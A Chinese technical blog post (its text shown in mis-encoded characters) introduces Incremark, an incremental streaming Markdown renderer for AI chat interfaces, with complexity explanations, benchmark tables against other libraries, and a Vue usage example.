                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä» O(nÂ²) åˆ° O(n)ï¼šä¸º AI æ—¶ä»£æ‰“é€ çš„æµå¼ Markdown æ¸²æŸ“å™¨</h2>
<p>å¦‚æœä½ å¼€å‘è¿‡ AI èŠå¤©åº”ç”¨ï¼Œä½ å¯èƒ½æ³¨æ„åˆ°ä¸€ä¸ªä»¤äººæ²®ä¸§çš„é—®é¢˜ï¼š<strong>å¯¹è¯è¶Šé•¿ï¼Œæ¸²æŸ“è¶Šå¡</strong>ã€‚</p>
<p>åŸå› å¾ˆç®€å•â€”â€”æ¯æ¬¡ AI è¾“å‡ºæ–°çš„ tokenï¼Œä¼ ç»Ÿ markdown è§£æå™¨éƒ½ä¼š<em>ä»å¤´å¼€å§‹</em>é‡æ–°è§£ææ•´ä¸ªæ–‡æ¡£ã€‚è¿™æ˜¯ä¸€ä¸ªæ ¹æœ¬æ€§çš„æ¶æ„é—®é¢˜ï¼Œè€Œä¸”éšç€ AI è¾“å‡ºè¶Šæ¥è¶Šé•¿ï¼Œé—®é¢˜åªä¼šè¶Šæ¥è¶Šä¸¥é‡ã€‚</p>
<p>æˆ‘ä»¬å¼€å‘äº† <strong>Incremark</strong> æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<h3 data-id="heading-1">2025 å¹´ AI çš„æ®‹é…·ç°å®</h3>
<p>å¦‚æœä½ ä¸€ç›´å…³æ³¨ AI çš„å‘å±•ï¼Œä½ ä¼šå‘ç°æ•°æ®å˜å¾—è¶Šæ¥è¶Šå¤¸å¼ ï¼š</p>
<ul>
<li><strong>2022</strong>ï¼šGPT-3.5 çš„å›å¤ï¼Ÿå‡ ç™¾ä¸ªå­—ï¼Œé—®é¢˜ä¸å¤§</li>
<li><strong>2023</strong>ï¼šGPT-4 æŠŠè¾“å‡ºæå‡åˆ° 2,000-4,000 å­—</li>
<li><strong>2024-2025</strong>ï¼šæ¨ç†æ¨¡å‹ï¼ˆo1ã€DeepSeek R1ï¼‰è¾“å‡º <strong>10,000+ å­—çš„"æ€è€ƒè¿‡ç¨‹"</strong></li>
</ul>
<p>æˆ‘ä»¬æ­£åœ¨ä» 4K token çš„å¯¹è¯èµ°å‘ 32Kï¼Œç”šè‡³ 128Kã€‚æ²¡äººè°ˆè®ºçš„ä¸€ä¸ªäº‹å®æ˜¯ï¼š<strong>æ¸²æŸ“ 500 å­—å’Œæ¸²æŸ“ 50,000 å­—çš„ Markdown æ˜¯å®Œå…¨ä¸åŒçš„å·¥ç¨‹é—®é¢˜ã€‚</strong></p>
<p>å¤§å¤šæ•° markdown åº“ï¼Ÿå®ƒä»¬æ˜¯ä¸ºåšå®¢æ–‡ç« è®¾è®¡çš„ï¼Œä¸æ˜¯ä¸ºä¼š"å¤§å£°æ€è€ƒ"çš„ AI è®¾è®¡çš„ã€‚</p>
<h3 data-id="heading-2">ä¸ºä»€ä¹ˆä½ çš„ Markdown è§£æå™¨åœ¨éª—ä½ </h3>
<p>å½“ä½ é€šè¿‡ä¼ ç»Ÿè§£æå™¨æµå¼ä¼ è¾“ AI è¾“å‡ºæ—¶ï¼Œåº•å±‚å‘ç”Ÿäº†ä»€ä¹ˆï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Chunk 1:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">100</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">âœ“</span>
<span class="hljs-attr">Chunk 2:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">200</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">(100</span> <span class="hljs-string">æ—§</span> <span class="hljs-string">+</span> <span class="hljs-number">100</span> <span class="hljs-string">æ–°)</span>
<span class="hljs-attr">Chunk 3:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">300</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">(200</span> <span class="hljs-string">æ—§</span> <span class="hljs-string">+</span> <span class="hljs-number">100</span> <span class="hljs-string">æ–°)</span>
<span class="hljs-string">...</span>
<span class="hljs-attr">Chunk 100:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">10</span><span class="hljs-string">,000</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">ğŸ˜°</span>
</code></pre>
<p>æ€»å·¥ä½œé‡ï¼š<code>100 + 200 + 300 + ... + 10,000 = 5,050,000</code> å­—ç¬¦æ“ä½œã€‚</p>
<p>è¿™æ˜¯ <strong>O(nÂ²)</strong>ã€‚æˆæœ¬ä¸æ˜¯çº¿æ€§å¢é•¿â€”â€”è€Œæ˜¯<em>çˆ†ç‚¸å¼å¢é•¿</em>ã€‚</p>
<p>å¯¹äº 20KB çš„ AI å›å¤ï¼Œè¿™æ„å‘³ç€ï¼š</p>
<ul>
<li><strong>ant-design-x</strong>ï¼š1,657 ms è§£ææ—¶é—´</li>
<li><strong>markstream-vue</strong>ï¼š5,755 msï¼ˆå°†è¿‘ <strong>6 ç§’</strong>çš„è§£æï¼ï¼‰</li>
</ul>
<p>è€Œè¿™äº›éƒ½æ˜¯æµè¡Œçš„ã€ç»´æŠ¤è‰¯å¥½çš„åº“ã€‚é—®é¢˜ä¸åœ¨äºä»£ç å†™å¾—ä¸å¥½â€”â€”è€Œåœ¨äºæ¶æ„é€‰æ‹©é”™è¯¯ã€‚</p>
<h3 data-id="heading-3">æ ¸å¿ƒæ´å¯Ÿ</h3>
<p>å…³é”®åœ¨è¿™é‡Œï¼š</p>
<p><strong>ä¸€æ—¦ä¸€ä¸ª markdown å—"å®Œæˆ"ï¼Œå®ƒå°±æ°¸è¿œä¸ä¼šæ”¹å˜ã€‚</strong></p>
<p>æƒ³æƒ³çœ‹ã€‚å½“ AI è¾“å‡ºï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># æ ‡é¢˜</span>

è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚

</code></pre>
<p>åœ¨ç¬¬äºŒä¸ªç©ºè¡Œä¹‹åï¼Œè¿™ä¸ªæ®µè½å°±<em>å®Œæˆ</em>äº†ã€‚é”å®šäº†ã€‚æ— è®ºåé¢æ¥ä»€ä¹ˆâ€”â€”ä»£ç å—ã€åˆ—è¡¨ã€æ›´å¤šæ®µè½â€”â€”è¿™ä¸ªæ®µè½æ°¸è¿œä¸ä¼šå†è¢«åŠ¨äº†ã€‚</p>
<p>é‚£æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦é‡å¤è§£æå®ƒ 500 æ¬¡ï¼Ÿ</p>
<h3 data-id="heading-4">Incremark çš„å·¥ä½œåŸç†</h3>
<p>æˆ‘ä»¬å›´ç»•è¿™ä¸ªæ´å¯Ÿæ„å»ºäº† <strong>Incremark</strong>ã€‚æ ¸å¿ƒç®—æ³•ï¼š</p>
<ol>
<li><strong>æ£€æµ‹ç¨³å®šè¾¹ç•Œ</strong> â€” ç©ºè¡Œã€æ–°æ ‡é¢˜ã€ä»£ç å—ç»“æŸç¬¦</li>
<li><strong>ç¼“å­˜å·²å®Œæˆçš„å—</strong> â€” æ°¸ä¸å†åŠ¨</li>
<li><strong>åªé‡æ–°è§£æå¾…å¤„ç†çš„å—</strong> â€” å½“å‰æ­£åœ¨æ¥æ”¶è¾“å…¥çš„é‚£ä¸ª</li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Chunk 1:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">100</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">â†’</span> <span class="hljs-string">ç¼“å­˜ç¨³å®šå—</span>
<span class="hljs-attr">Chunk 2:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
<span class="hljs-attr">Chunk 3:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
<span class="hljs-string">...</span>
<span class="hljs-attr">Chunk 100:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
</code></pre>
<p>æ€»å·¥ä½œé‡ï¼š<code>100 Ã— 100 = 10,000</code> å­—ç¬¦æ“ä½œã€‚</p>
<p>è¿™æ˜¯ <strong>500 å€çš„å‡å°‘</strong>ã€‚æ¯ä¸ªå­—ç¬¦æœ€å¤šåªè¢«è§£æä¸€æ¬¡ã€‚è¿™å°±æ˜¯ O(n)ã€‚</p>
<h3 data-id="heading-5">å®Œæ•´åŸºå‡†æµ‹è¯•æ•°æ®</h3>
<p>æˆ‘ä»¬å¯¹ <strong>38 ä¸ªçœŸå® markdown æ–‡ä»¶</strong>è¿›è¡Œäº†åŸºå‡†æµ‹è¯•â€”â€”AI å¯¹è¯ã€æ–‡æ¡£ã€ä»£ç åˆ†ææŠ¥å‘Šã€‚ä¸æ˜¯åˆæˆæµ‹è¯•æ•°æ®ã€‚æ€»è®¡ï¼š6,484 è¡Œï¼Œ128.55 KBã€‚</p>
<p>å®Œæ•´æ•°æ®è¡¨ï¼š</p>


























































































































<table><thead><tr><th>æ–‡ä»¶</th><th>è¡Œæ•°</th><th>å¤§å°</th><th>Incremark</th><th>Streamdown</th><th>markstream-vue</th><th>ant-design-x</th></tr></thead><tbody><tr><td>test-footnotes-simple.md</td><td>15</td><td>0.09 KB</td><td>0.3 ms</td><td>0.0 ms</td><td>1.4 ms</td><td>0.2 ms</td></tr><tr><td>simple-paragraphs.md</td><td>16</td><td>0.41 KB</td><td>0.9 ms</td><td>0.9 ms</td><td>5.9 ms</td><td>1.0 ms</td></tr><tr><td>introduction.md</td><td>34</td><td>1.57 KB</td><td>5.6 ms</td><td>12.6 ms</td><td>75.6 ms</td><td>12.8 ms</td></tr><tr><td>footnotes.md</td><td>52</td><td>0.94 KB</td><td>1.7 ms</td><td>0.2 ms</td><td>10.6 ms</td><td>1.9 ms</td></tr><tr><td>concepts.md</td><td>91</td><td>4.29 KB</td><td>12.0 ms</td><td>50.5 ms</td><td>381.9 ms</td><td>53.6 ms</td></tr><tr><td>comparison.md</td><td>109</td><td>5.39 KB</td><td>20.5 ms</td><td>74.0 ms</td><td>552.2 ms</td><td>85.2 ms</td></tr><tr><td>complex-html-examples.md</td><td>147</td><td>3.99 KB</td><td>9.0 ms</td><td>58.8 ms</td><td>279.3 ms</td><td>57.2 ms</td></tr><tr><td>FOOTNOTE_FIX_SUMMARY.md</td><td>236</td><td>3.93 KB</td><td>22.7 ms</td><td>0.5 ms</td><td>535.0 ms</td><td>120.8 ms</td></tr><tr><td>OPTIMIZATION_SUMMARY.md</td><td>391</td><td>6.24 KB</td><td>19.1 ms</td><td>208.4 ms</td><td>980.6 ms</td><td>217.8 ms</td></tr><tr><td>BLOCK_TRANSFORMER_ANALYSIS.md</td><td>489</td><td>9.24 KB</td><td>75.7 ms</td><td>574.3 ms</td><td>1984.1 ms</td><td>619.9 ms</td></tr><tr><td>test-md-01.md</td><td>916</td><td>17.67 KB</td><td>87.7 ms</td><td>1441.1 ms</td><td>5754.7 ms</td><td>1656.9 ms</td></tr><tr><td><strong>æ€»è®¡ (38 æ–‡ä»¶)</strong></td><td><strong>6484</strong></td><td><strong>128.55 KB</strong></td><td><strong>519.4 ms</strong></td><td><strong>3190.3 ms</strong></td><td><strong>14683.9 ms</strong></td><td><strong>3728.6 ms</strong></td></tr></tbody></table>
<h4 data-id="heading-6">è¯šå®é¢å¯¹ï¼šæˆ‘ä»¬æ…¢çš„åœ°æ–¹</h4>
<p>ä½ ä¼šæ³¨æ„åˆ°æ•°æ®ä¸­æœ‰äº›å¥‡æ€ªçš„åœ°æ–¹ã€‚å¯¹äº <code>footnotes.md</code> å’Œ <code>FOOTNOTE_FIX_SUMMARY.md</code>ï¼ŒStreamdown çœ‹èµ·æ¥å¿«å¾—å¤šï¼š</p>























<table><thead><tr><th>æ–‡ä»¶</th><th>Incremark</th><th>Streamdown</th><th>åŸå› </th></tr></thead><tbody><tr><td>footnotes.md</td><td>1.7 ms</td><td>0.2 ms</td><td>Streamdown ä¸æ”¯æŒè„šæ³¨</td></tr><tr><td>FOOTNOTE_FIX_SUMMARY.md</td><td>22.7 ms</td><td>0.5 ms</td><td>åŒä¸Šâ€”â€”å®ƒç›´æ¥è·³è¿‡äº†</td></tr></tbody></table>
<p><strong>è¿™ä¸æ˜¯æ€§èƒ½é—®é¢˜â€”â€”è¿™æ˜¯åŠŸèƒ½å·®å¼‚ã€‚</strong></p>
<p>å½“ Streamdown é‡åˆ° <code>[^1]</code> è„šæ³¨è¯­æ³•æ—¶ï¼Œå®ƒç›´æ¥å¿½ç•¥ã€‚Incremark å®Œæ•´å®ç°äº†è„šæ³¨â€”â€”è€Œä¸”æˆ‘ä»¬å¿…é¡»è§£å†³ä¸€ä¸ªæµå¼åœºæ™¯ç‰¹æœ‰çš„æ£˜æ‰‹é—®é¢˜ï¼š</p>
<p>åœ¨æµå¼åœºæ™¯ä¸­ï¼Œ<strong>å¼•ç”¨é€šå¸¸æ¯”å®šä¹‰å…ˆåˆ°è¾¾</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">Chunk <span class="hljs-number">1</span>: <span class="hljs-string">"è¯¦è§è„šæ³¨[^1]..."</span>           <span class="hljs-comment">// å¼•ç”¨å…ˆåˆ°è¾¾</span>
Chunk <span class="hljs-number">2</span>: <span class="hljs-string">"æ›´å¤šå†…å®¹..."</span>
Chunk <span class="hljs-number">3</span>: <span class="hljs-string">"[^1]: è¿™æ˜¯è„šæ³¨å®šä¹‰"</span>        <span class="hljs-comment">// å®šä¹‰ååˆ°è¾¾</span>
</code></pre>
<p>ä¼ ç»Ÿè§£æå™¨å‡è®¾ä½ æœ‰å®Œæ•´çš„æ–‡æ¡£ã€‚æˆ‘ä»¬æ„å»ºäº†"ä¹è§‚å¼•ç”¨"æœºåˆ¶ï¼Œåœ¨æµå¼ä¼ è¾“è¿‡ç¨‹ä¸­ä¼˜é›…åœ°å¤„ç†ä¸å®Œæ•´çš„é“¾æ¥/å›¾ç‰‡ï¼Œç„¶ååœ¨å®šä¹‰åˆ°è¾¾æ—¶è§£æå®ƒä»¬ã€‚</p>
<p>æˆ‘ä»¬é€‰æ‹©å®Œæ•´å®ç°è„šæ³¨ã€æ•°å­¦å…¬å¼å—ï¼ˆ<code>$...$</code>ï¼‰å’Œè‡ªå®šä¹‰å®¹å™¨ï¼ˆ<code>:::tip</code>ï¼‰ï¼Œå› ä¸ºè¿™äº›æ˜¯çœŸå® AI å†…å®¹æ‰€éœ€è¦çš„ã€‚</p>
<h4 data-id="heading-7">æˆ‘ä»¬çœŸæ­£çš„ä¼˜åŠ¿</h4>
<p>æ’é™¤è„šæ³¨æ–‡ä»¶ï¼Œçœ‹çœ‹æ ‡å‡† markdown çš„æ€§èƒ½ï¼š</p>















































<table><thead><tr><th>æ–‡ä»¶</th><th>è¡Œæ•°</th><th>Incremark</th><th>Streamdown</th><th>ä¼˜åŠ¿</th></tr></thead><tbody><tr><td>concepts.md</td><td>91</td><td>12.0 ms</td><td>50.5 ms</td><td><strong>4.2x</strong></td></tr><tr><td>comparison.md</td><td>109</td><td>20.5 ms</td><td>74.0 ms</td><td><strong>3.6x</strong></td></tr><tr><td>complex-html-examples.md</td><td>147</td><td>9.0 ms</td><td>58.8 ms</td><td><strong>6.6x</strong></td></tr><tr><td>OPTIMIZATION_SUMMARY.md</td><td>391</td><td>19.1 ms</td><td>208.4 ms</td><td><strong>10.9x</strong></td></tr><tr><td>test-md-01.md</td><td>916</td><td>87.7 ms</td><td>1441.1 ms</td><td><strong>16.4x</strong></td></tr></tbody></table>
<p><strong>è§„å¾‹å¾ˆæ˜æ˜¾ï¼šæ–‡æ¡£è¶Šå¤§ï¼Œæˆ‘ä»¬çš„ä¼˜åŠ¿è¶Šå¤§ã€‚</strong></p>
<p>å¯¹äºæœ€å¤§çš„æ–‡ä»¶ï¼ˆ17.67 KBï¼‰ï¼š</p>
<ul>
<li><strong>Incremark</strong>ï¼š88 ms</li>
<li><strong>ant-design-x</strong>ï¼š1,657 msï¼ˆæ…¢ 18.9 å€ï¼‰</li>
<li><strong>markstream-vue</strong>ï¼š5,755 msï¼ˆæ…¢ 65.6 å€ï¼‰</li>
</ul>
<h4 data-id="heading-8">ä¸ºä»€ä¹ˆå·®è·è¿™ä¹ˆå¤§ï¼Ÿ</h4>
<p>è¿™å°±æ˜¯ O(n) vs O(nÂ²) çš„å®é™…è¡¨ç°ã€‚</p>
<p>ä¼ ç»Ÿè§£æå™¨æ¯æ¬¡æ”¶åˆ°æ–° chunk éƒ½é‡æ–°è§£ææ•´ä¸ªæ–‡æ¡£ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Chunk 1:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">100</span> <span class="hljs-string">å­—ç¬¦</span>
<span class="hljs-attr">Chunk 2:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">200</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">(100</span> <span class="hljs-string">æ—§</span> <span class="hljs-string">+</span> <span class="hljs-number">100</span> <span class="hljs-string">æ–°)</span>
<span class="hljs-attr">Chunk 3:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">300</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">(200</span> <span class="hljs-string">æ—§</span> <span class="hljs-string">+</span> <span class="hljs-number">100</span> <span class="hljs-string">æ–°)</span>
<span class="hljs-string">...</span>
<span class="hljs-attr">Chunk 100:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">10</span><span class="hljs-string">,000</span> <span class="hljs-string">å­—ç¬¦</span>
</code></pre>
<p>æ€»å·¥ä½œé‡ï¼š<code>100 + 200 + ... + 10,000 = 5,050,000</code> å­—ç¬¦æ“ä½œã€‚</p>
<p>Incremark åªå¤„ç†æ–°å†…å®¹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Chunk 1:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">100</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">â†’</span> <span class="hljs-string">ç¼“å­˜ç¨³å®šå—</span>
<span class="hljs-attr">Chunk 2:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
<span class="hljs-attr">Chunk 3:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
<span class="hljs-string">...</span>
<span class="hljs-attr">Chunk 100:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
</code></pre>
<p>æ€»å·¥ä½œé‡ï¼š<code>100 Ã— 100 = 10,000</code> å­—ç¬¦æ“ä½œã€‚</p>
<p>è¿™æ˜¯ <strong>500 å€çš„å·®è·</strong>ã€‚è€Œä¸”éšç€æ–‡æ¡£å¢é•¿ï¼Œå·®è·åªä¼šæ›´å¤§ã€‚</p>
<h4 data-id="heading-9">ä»€ä¹ˆæ—¶å€™ç”¨ Incremark</h4>
<p>âœ… <strong>é€‚åˆä½¿ç”¨ Incremark çš„åœºæ™¯ï¼š</strong></p>
<ul>
<li>AI èŠå¤©æµå¼è¾“å‡ºï¼ˆClaudeã€ChatGPT ç­‰ï¼‰</li>
<li>é•¿ç¯‡ AI å†…å®¹ï¼ˆæ¨ç†æ¨¡å‹ã€ä»£ç ç”Ÿæˆï¼‰</li>
<li>å®æ—¶ markdown ç¼–è¾‘å™¨</li>
<li>éœ€è¦è„šæ³¨ã€æ•°å­¦å…¬å¼æˆ–è‡ªå®šä¹‰å®¹å™¨çš„å†…å®¹</li>
<li>100K+ token çš„å¯¹è¯</li>
</ul>
<p>âš ï¸ <strong>è€ƒè™‘ä½¿ç”¨å…¶ä»–æ–¹æ¡ˆçš„åœºæ™¯ï¼š</strong></p>
<ul>
<li>ä¸€æ¬¡æ€§é™æ€ markdown æ¸²æŸ“ï¼ˆç›´æ¥ç”¨ marked å°±è¡Œï¼‰</li>
<li>éå¸¸å°çš„æ–‡ä»¶ï¼ˆ&lt;500 å­—ç¬¦ï¼‰â€”â€”å¼€é”€ä¸å€¼å¾—</li>
</ul>
<h3 data-id="heading-10">åŒå¼•æ“ï¼Œä¸€ä¸ªç›®æ ‡</h3>
<p><strong>Marked è¿˜æ˜¯ Micromarkï¼Ÿ</strong> ä¸¤è€…å„æœ‰å–èˆã€‚</p>
<p>Marked æå¿«ä½†ç¼ºå°‘é«˜çº§åŠŸèƒ½ã€‚Micromark è§„èŒƒå®Œç¾ä½†æ›´é‡ã€‚</p>
<p>æˆ‘ä»¬çš„ç­”æ¡ˆï¼š<strong>ä¸¤ä¸ªéƒ½æ”¯æŒã€‚</strong></p>




















<table><thead><tr><th>å¼•æ“</th><th>é€Ÿåº¦</th><th>æœ€ä½³åœºæ™¯</th></tr></thead><tbody><tr><td><strong>Marked</strong>ï¼ˆé»˜è®¤ï¼‰</td><td>âš¡âš¡âš¡âš¡âš¡</td><td>å®æ—¶æµå¼ã€AI å¯¹è¯</td></tr><tr><td><strong>Micromark</strong></td><td>âš¡âš¡âš¡</td><td>å¤æ‚æ–‡æ¡£ã€ä¸¥æ ¼ CommonMark</td></tr></tbody></table>
<p>æˆ‘ä»¬ç”¨è‡ªå®šä¹‰ tokenizer æ‰©å±•äº† Markedï¼Œæ”¯æŒè„šæ³¨ã€æ•°å­¦å…¬å¼å’Œå®¹å™¨ã€‚å¦‚æœé‡åˆ° Marked æ— æ³•å¤„ç†çš„è¾¹ç•Œæƒ…å†µï¼Œåªéœ€ä¸€ä¸ªé…ç½®å°±èƒ½åˆ‡æ¢åˆ° Micromarkã€‚</p>
<p>ä¸¤ä¸ªå¼•æ“äº§ç”Ÿå®Œå…¨ç›¸åŒçš„ <strong>mdast</strong> è¾“å‡ºã€‚ä½ çš„æ¸²æŸ“ä»£ç ä¸å…³å¿ƒåº•å±‚ç”¨çš„æ˜¯å“ªä¸ªå¼•æ“ã€‚</p>
<h3 data-id="heading-11">æ²¡äººè°ˆè®ºçš„æ‰“å­—æœºé—®é¢˜</h3>
<p>ä½ çŸ¥é“ ChatGPT é‚£ç§ä¸æ»‘çš„"æ‰“å­—"æ•ˆæœå—ï¼Ÿå¤§å¤šæ•°å®ç°æ˜¯è¿™æ ·åšçš„ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">displayText = fullText.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, currentIndex)
</code></pre>
<p>è¿™ä¼šä¸æ–­ç ´å markdownã€‚ä½ ä¼šçœ‹åˆ°æ¸²æŸ“åˆ°ä¸€åŠçš„ <code>**ç²—ä½“**</code> æ ‡ç­¾ã€é—ªçƒçš„ä»£ç å—ã€çœ‹èµ·æ¥åƒå–é†‰äº†çš„è¯­æ³•ã€‚</p>
<p>æˆ‘ä»¬æŠŠåŠ¨ç”»ç§»åˆ°äº† <strong>AST å±‚</strong>ã€‚æˆ‘ä»¬çš„ <code>BlockTransformer</code> ç†è§£ç»“æ„â€”â€”å®ƒåœ¨èŠ‚ç‚¹<em>å†…éƒ¨</em>åšåŠ¨ç”»ï¼Œæ°¸è¿œä¸ä¼šè·¨èŠ‚ç‚¹ã€‚ç»“æœï¼šä¸æ»‘æµç•…çš„æ‰“å­—æ•ˆæœï¼ŒåŒæ—¶å°Šé‡ markdown è¯­ä¹‰ã€‚</p>
<h3 data-id="heading-12">åŠ¨æ‰‹è¯•è¯•</h3>
<pre><code class="hljs language-bash" lang="bash">npm install @incremark/vue  <span class="hljs-comment"># æˆ– reactã€svelte</span>
</code></pre>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { ref } from 'vue'
import { IncremarkContent } from '@incremark/vue'

const content = ref('')
const isFinished = ref(false)

async function handleStream(stream) {
  for await (const chunk of stream) {
    content.value += chunk
  }
  isFinished.value = true
}
&lt;/script&gt;

&lt;template&gt;
  &lt;IncremarkContent 
    :content="content" 
    :is-finished="isFinished"
    :incremark-options="{ gfm: true, math: true }"
  /&gt;
&lt;/template&gt;
</code></pre>
<p>æˆ‘ä»¬æ”¯æŒ <strong>Vue 3</strong>ã€<strong>React 18</strong> å’Œ <strong>Svelte 5</strong>ï¼ŒAPI å®Œå…¨ä¸€è‡´ã€‚ä¸€ä¸ªæ ¸å¿ƒï¼Œä¸‰ä¸ªæ¡†æ¶ï¼Œé›¶è¡Œä¸ºå·®å¼‚ã€‚</p>
<h3 data-id="heading-13">ä¸‹ä¸€æ­¥</h3>
<p>è¿™æ˜¯ 0.3.0 ç‰ˆæœ¬ã€‚æˆ‘ä»¬æ‰åˆšåˆšå¼€å§‹ã€‚</p>
<p>AI ä¸–ç•Œæ­£åœ¨èµ°å‘æ›´é•¿çš„è¾“å‡ºã€æ›´å¤æ‚çš„æ¨ç†è½¨è¿¹ã€æ›´ä¸°å¯Œçš„æ ¼å¼ã€‚ä¼ ç»Ÿè§£æå™¨è·Ÿä¸ä¸Šâ€”â€”å®ƒä»¬çš„ O(nÂ²) æ¶æ„æ³¨å®šå¦‚æ­¤ã€‚</p>
<p>æˆ‘ä»¬å¼€å‘ Incremark æ˜¯å› ä¸ºæˆ‘ä»¬è‡ªå·±éœ€è¦å®ƒã€‚å¸Œæœ›ä½ ä¹Ÿè§‰å¾—å®ƒæœ‰ç”¨ã€‚</p>
<hr/>
<p>ğŸ“š <strong>æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.incremark.com%2F" target="_blank" title="https://www.incremark.com/" ref="nofollow noopener noreferrer">incremark.com</a>
